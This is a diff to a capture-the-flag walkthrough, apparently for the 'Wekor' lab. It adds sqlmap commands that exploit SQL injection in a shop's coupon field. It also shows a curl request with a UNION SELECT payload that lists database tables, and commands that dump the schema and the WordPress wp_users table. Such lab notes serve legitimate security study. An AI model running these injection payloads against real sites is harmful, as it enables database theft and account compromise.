@@ -39,10 +39,19 @@ curl -X POST http://${URL}/it-next/it_cart.php \
 curl -X POST http://${URL}/it-next/it_cart.php \
   -d "coupon_code=' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -" \ -d "apply_coupon=Apply Coupon" | grep -i code
 ```
-SQLMAP
+Use SQLMAP to determine if the database can be pull
 ```bash
 sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
 ```
+Use SQLMAP to explore databases and tables
+```bash
+sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --schema
+```
+Use SQLMAP to pull specific database and table
+```bash
+sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
+```
+
 ## Resource
 https://erichogue.ca/2021/06/Wekor
 
